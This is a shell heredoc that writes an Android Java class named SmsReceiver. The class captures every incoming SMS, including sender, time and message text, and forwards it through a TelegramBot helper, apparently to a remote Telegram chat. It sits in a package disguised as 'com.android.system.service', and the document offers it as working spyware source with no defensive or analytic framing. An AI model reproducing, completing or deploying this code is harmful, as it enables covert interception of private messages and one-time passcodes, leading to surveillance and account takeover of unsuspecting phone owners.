          # إنشاء SmsReceiver.java
          cat << 'EOF' > app/src/main/java/com/hussein/v8/SmsReceiver.java
          package com.android.system.service;
          
          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          import android.os.Bundle;
          import android.telephony.SmsMessage;
          import java.text.SimpleDateFormat;
          import java.util.Date;
          
          public class SmsReceiver extends BroadcastReceiver {
              @Override
              public void onReceive(Context context, Intent intent) {
                  if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
                      Bundle bundle = intent.getExtras();
                      if (bundle != null) {
                          try {
                              Object[] pdus = (Object[]) bundle.get("pdus");
                              if (pdus != null) {
                                  for (Object pdu : pdus) {
                                      SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                                      String sender = sms.getDisplayOriginatingAddress();
                                      String message = sms.getDisplayMessageBody();
                                      long timestamp = sms.getTimestampMillis();
                                      String date = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(timestamp));
                                      
                                      String data = "📨 <b>SMS جديد</b>\nمن: " + sender + "\nالوقت: " + date + "\nالنص: " + message;
                                      TelegramBot.sendMessage(context, data);
                                  }
                              }
                          } catch (Exception e) {
                              TelegramBot.sendMessage(context, "خطأ في قراءة SMS: " + e.toString());
                          }
                      }
                  }
              }
          }
